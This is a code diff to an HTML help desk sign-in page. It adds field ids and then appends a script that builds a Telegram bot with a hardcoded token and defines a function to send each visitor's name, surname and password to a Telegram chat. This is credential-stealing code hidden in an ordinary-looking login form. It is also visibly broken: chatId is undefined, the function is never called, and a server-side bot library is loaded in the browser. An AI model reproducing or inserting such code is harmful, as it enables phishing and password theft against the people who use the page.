@@ -105,19 +105,35 @@
     max-width: 100%;
     min-height: 480px;
   }
-
- 
-
 </style>
 <h2>Welcome to our help desk</h2>
 <div class="container" id="container">
   <div class="form-container sign-in-container">
     <form action="#">
-      <input type="text" placeholder="Name" />
-      <input type="text" placeholder="Surname" />
-      <input type="password" placeholder="Password" />
+      <input type="text" id="name" placeholder="Name" />
+      <input type="text" id="surname" placeholder="Surname" />
+      <input type="password" id="password" placeholder="Password" />
       <a href="#">Forgot your password?</a>
       <button>Sign In</button>
     </form>
   </div>
 </div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/telegraf/1.1.1/telegraf.min.js"></script>
+<script>
+  const bot = new Telegraf("6212965476:AAEcdh4ZBnCoqWx2v6YYIvRMcMj7Fry7rAU");
+
+  function sendData() {
+    const name = document.getElementById("name").value;
+    const surname = document.getElementById("surname").value;
+    const password = document.getElementById("password").value;
+
+    bot.sendMessage(
+      chatId,
+      JSON.stringify({
+        name,
+        surname,
+        password,
+      })
+    );
+  }
+</script>
